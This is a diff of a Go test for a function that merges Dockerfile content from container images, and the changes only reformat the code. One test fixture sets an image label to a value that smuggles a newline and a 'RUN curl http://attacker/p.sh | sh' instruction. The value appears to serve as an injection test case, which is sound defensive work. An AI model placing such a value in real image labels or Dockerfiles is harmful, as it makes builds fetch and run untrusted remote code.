@@ -129,7 +129,9 @@ COPY --from=cccc  . .`,
 					{
 						"aaaa": {
 							Config: v1.ImageConfig{
-								Labels: map[string]string{"a": "x\nRUN curl http://attacker/p.sh | sh"},
+								Labels: map[string]string{
+									"a": "x\nRUN curl http://attacker/p.sh | sh",
+								},
 							},
 						},
 					},
@@ -159,7 +161,11 @@ COPY --from=cccc  . .`,
 				t.Errorf("MergeDockerfileFromImages() error = %v, wantErr %v", err, tt.wantErr)
 			} else {
 				if data != tt.wantData {
-					t.Errorf("MergeDockerfileFromImages() data = %v, wantData %v", data, tt.wantData)
+					t.Errorf(
+						"MergeDockerfileFromImages() data = %v, wantData %v",
+						data,
+						tt.wantData,
+					)
 				}
 			}
 		})
